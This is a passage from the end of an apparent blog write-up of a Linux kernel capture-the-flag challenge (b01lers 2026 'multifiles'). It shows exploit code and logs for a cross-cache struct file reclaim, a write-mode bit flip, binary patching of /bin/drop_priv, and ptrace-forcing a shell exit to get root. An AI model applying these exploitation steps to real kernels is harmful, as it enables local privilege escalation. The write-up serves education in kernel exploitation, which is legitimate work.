+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">3</span><span><span style="color:#c678dd">for</span> (<span style="color:#e06c75">i</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>; <span style="color:#e06c75">i</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">TARGET_EMPTY_PAGES</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">1</span>; <span style="color:#e06c75">i</span><span style="color:#56b6c2">++</span>) <span style="color:#61afef;font-weight:bold">free_full_page</span>(<span style="color:#e06c75">fds</span>, <span style="color:#e06c75">press</span>[<span style="color:#d19a66">11</span><span style="color:#56b6c2">+</span><span style="color:#e06c75">i</span>]);<span style="color:#7f848e">// 9
+</span></span></span></code></pre></div><p>Then we poison <code>A</code>&rsquo;s tail and realize the fake object exactly as before — only now its body straddles into <code>B</code>&rsquo;s <em>freed</em> physical page. Spraying <code>open(&quot;/bin/drop_priv&quot;, O_RDONLY|O_NONBLOCK)</code> makes <code>filp_cachep</code> reclaim that page; the first <code>struct file</code> lands at <code>B+0</code>, right under the fake object. After each open we read the straddle window (<code>f_pos=0x1f</code>, so <code>B+x</code> is at <code>buf[1+x]</code>) and test for the file: <code>f_mode</code> is <code>READ|CAN_READ</code> with no <code>WRITE</code>, <code>f_op</code>/<code>f_mapping</code>/<code>f_inode</code> look like kernel pointers, <code>private_data == 0</code>, and <code>f_flags == O_NONBLOCK|O_LARGEFILE</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">1</span><span><span style="color:#56b6c2">[</span>+<span style="color:#56b6c2">]</span> B reclaimed as /bin/drop_priv struct file after <span style="color:#d19a66">188</span> opens
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">2</span><span>    <span style="color:#e06c75">f_mode</span><span style="color:#56b6c2">=</span>0x004a801d <span style="color:#e06c75">f_flags</span><span style="color:#56b6c2">=</span>0x00008800 <span style="color:#e06c75">f_op</span><span style="color:#56b6c2">=</span>0xffffffff95c1acc0
+</span></span></code></pre></div><h3 id="from-f_mode-to-a-root-shell">From f_mode to a root shell</h3>
+<p><code>vfs_write()</code> gates on the write bits in <code>file-&gt;f_mode</code>, and we have a write primitive into that exact <code>struct file</code>, so we OR them in through the straddle window:</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">1</span><span><span style="color:#e06c75">mode</span> <span style="color:#56b6c2">|=</span> <span style="color:#e06c75">FMODE_WRITE</span> <span style="color:#56b6c2">|</span> <span style="color:#e06c75">FMODE_PWRITE</span> <span style="color:#56b6c2">|</span> <span style="color:#e06c75">FMODE_CAN_WRITE</span>;   <span style="color:#7f848e">// at buf[1 + 0x0c]
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">2</span><span><span style="color:#61afef;font-weight:bold">mf_write</span>(<span style="color:#e06c75">fake_store</span>, <span style="color:#e06c75">fake</span>, <span style="color:#d19a66">0x1f</span>, <span style="color:#e06c75">buf</span>, <span style="color:#d19a66">0x40</span>);
+</span></span></code></pre></div><p>The read-only fd we opened is now writable. <code>/bin/drop_priv</code> just <code>setuid(1000)</code>s and <code>exec</code>s a shell, so we only need its two <code>1000</code> immediates to become <code>0</code>. We find them by scanning the binary for the <code>mov edi, 1000 ; call</code> pattern (offsets <code>0x1514</code>, <code>0x152f</code> here) and <code>pwrite</code> zeros over them:</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">1</span><span><span style="color:#61afef;font-weight:bold">patch_drop_priv_fd</span>(<span style="color:#e06c75">target_fd</span>, <span style="color:#e06c75">poff</span>, <span style="color:#e06c75">npoff</span>);   <span style="color:#7f848e">// pwrite 0x00000000 over each 0x000003e8
+</span></span></span></code></pre></div><p>Then the handoff. The initrd&rsquo;s <code>init</code> is an infinite <code>while true; do /bin/drop_priv; done</code>, so we just need the current (uid 1000) shell to exit and the loop re-runs the patched binary. We <code>ptrace</code> the parent shell and rewrite its registers to <code>exit_group(0)</code>, pointing <code>rip</code> at a <code>syscall; ret</code> in its vDSO:</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">1</span><span><span style="color:#61afef;font-weight:bold">make_parent_exit_zero</span>();   <span style="color:#7f848e">// ATTACH parent; rax=__NR_exit_group, rdi=0, rip=vdso syscall;ret
+</span></span></span></code></pre></div><p>This needs no privileges, which surprised me at first. At this point we&rsquo;re still uid 1000 and so is the parent shell, and same-uid <code>ptrace</code> is unprivileged — you only need <code>CAP_SYS_PTRACE</code> to attach across a privilege boundary. On top of that this kernel ships without Yama (<code>CONFIG_SECURITY_YAMA</code> is unset), so there&rsquo;s no <code>ptrace_scope</code> to forbid attaching to an ancestor. If it ever did fail, poking <code>exit</code> into the tty with <code>TIOCSTI</code> or just <code>kill</code>ing the shell would do the same job.</p>
+<p>No kernel payload, no <code>commit_creds</code>, no KASLR-dependent symbol — just a patched suid-like helper. init respawns the shell through the patched <code>drop_priv</code>, and it comes up root:</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 1</span><span><span style="color:#56b6c2">[</span>~<span style="color:#56b6c2">]</span> root
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 2</span><span><span style="color:#56b6c2">[</span>+<span style="color:#56b6c2">]</span> <span style="color:#e06c75">A</span><span style="color:#56b6c2">=</span>0xffff9de3419c2000  <span style="color:#e06c75">B</span><span style="color:#56b6c2">=</span>0xffff9de3419c3000
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 3</span><span><span style="color:#56b6c2">[</span>+<span style="color:#56b6c2">]</span> drop_priv patch offsets: 0x1514 0x152f
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 4</span><span><span style="color:#56b6c2">[</span>+<span style="color:#56b6c2">]</span> B reclaimed as /bin/drop_priv struct file after <span style="color:#d19a66">188</span> opens
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 5</span><span><span style="color:#56b6c2">[</span>+<span style="color:#56b6c2">]</span> flipped FMODE_WRITE on the read-only struct file
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 6</span><span>    patch<span style="color:#56b6c2">[</span>0<span style="color:#56b6c2">]</span> <span style="color:#e06c75">off</span><span style="color:#56b6c2">=</span>0x1514 <span style="color:#e06c75">old</span><span style="color:#56b6c2">=</span>0x000003e8
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 7</span><span>    patch<span style="color:#56b6c2">[</span>1<span style="color:#56b6c2">]</span> <span style="color:#e06c75">off</span><span style="color:#56b6c2">=</span>0x152f <span style="color:#e06c75">old</span><span style="color:#56b6c2">=</span>0x000003e8
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 8</span><span><span style="color:#56b6c2">[</span>+<span style="color:#56b6c2">]</span> patched /bin/drop_priv
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 9</span><span><span style="color:#56b6c2">[</span>+<span style="color:#56b6c2">]</span> forced parent shell exit<span style="color:#56b6c2">(</span>0<span style="color:#56b6c2">)</span> -&gt; init respawns a root shell
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">10</span><span>/home/ctf <span style="color:#7f848e"># id</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">11</span><span><span style="color:#e06c75">uid</span><span style="color:#56b6c2">=</span>0<span style="color:#56b6c2">(</span>root<span style="color:#56b6c2">)</span> <span style="color:#e06c75">gid</span><span style="color:#56b6c2">=</span>0<span style="color:#56b6c2">(</span>root<span style="color:#56b6c2">)</span> <span style="color:#e06c75">groups</span><span style="color:#56b6c2">=</span>0<span style="color:#56b6c2">(</span>root<span style="color:#56b6c2">)</span>
+</span></span></code></pre></div><p>That&rsquo;s the whole chain: a base-vs-bounds OOB inside one hardened SLUB cache, turned into a heap leak, a freelist forge, a page-straddling fake object, a cross-cache reclaim, and finally a userland binary patch — <code>bctf{:3}</code> never needed.</p>
+<p>Full source code can be found <a href="https://github.com/icctx/ctf/tree/main/b01lers.2026/multifiles/x">here</a>.</p>
+<hr>
+<h1 id="conclusion">Conclusion</h1>
+<p>That wraps up both kernel challenges from b01lers 2026. Multifiles was my favorite of the two. Hope it was a useful read.</p>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://icctx.xyz/blog/throughthewall/">Part 1: throughthewall</a> — the firewall UAF, and the same <code>/bin/drop_priv</code> patch finale from a different write primitive.</li>
+<li>KSPP study — <a href="https://samsung.github.io/kspp-study/heap-ovfl.html#protecting-the-integrity-of-heap-metadata">protecting heap metadata</a>: how <code>SLAB_FREELIST_HARDENED</code> works.</li>
+<li>duasynt — <a href="https://duasynt.com/blog/linux-kernel-heap-feng-shui-2022">Linux kernel heap feng shui in 2022</a></li>
+<li>sam4k — <a href="https://sam4k.com/exploring-linux-random-kmalloc-caches/">exploring Linux&rsquo;s random kmalloc caches</a></li>
+<li><a href="http://web.archive.org/web/20240203214126/https://yanglingxi1993.github.io/dirty_pagetable/dirty_pagetable.html">Dirty Pagetable</a></li>
+<li>r1ru — <a href="https://r1ru.github.io/categories/linux-kernel-exploitation/">Linux kernel exploitation series</a></li>
+</ul>
+
+</content>
+
+
+
+<p>
+  
+  <a href="http://localhost:1313/tags/kernel/">#Kernel</a>
+  
+  <a href="http://localhost:1313/tags/pwn/">#Pwn</a>
+  
+</p>
+
+  </main>
+  <footer>
+</footer>
+
+  <button id="theme-toggle" aria-label="Toggle theme"></button>
+
+<script>
+  (function () {
+    var btn = document.getElementById('theme-toggle');
+    var html = document.documentElement;
+
+    function isDark() {
+      var t = html.getAttribute('data-theme');
+      if (t === 'dark') return true;
+      if (t === 'light') return false;
+      return window.matchMedia('(prefers-color-scheme: dark)').matches;
+    }
+
+    function update() {
+      btn.textContent = isDark() ? '☀' : '☾';
+    }
+
+    update();
+
+    btn.addEventListener('click', function () {
+      var dark = isDark();
+      var next = dark ? 'light' : 'dark';
+      html.setAttribute('data-theme', next);
+      localStorage.setItem('theme', next);
+      update();
+    });
+  })();
+</script>
+</body>
+
+</html>
